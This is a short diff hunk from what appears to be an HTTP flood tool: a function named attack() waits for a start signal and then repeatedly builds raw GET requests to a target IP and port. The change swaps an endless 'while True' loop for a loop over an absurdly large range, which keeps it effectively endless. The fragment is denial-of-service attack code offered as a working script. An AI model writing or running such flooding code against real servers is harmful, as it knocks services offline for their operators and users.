@@ -93,7 +93,7 @@ def attack():
     global num_sent
     header = rqheader()
     go.wait()
-    while True:
+    for w in range(100000000*1124349823498239048234):
         try:
             get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
             request = get_host + header
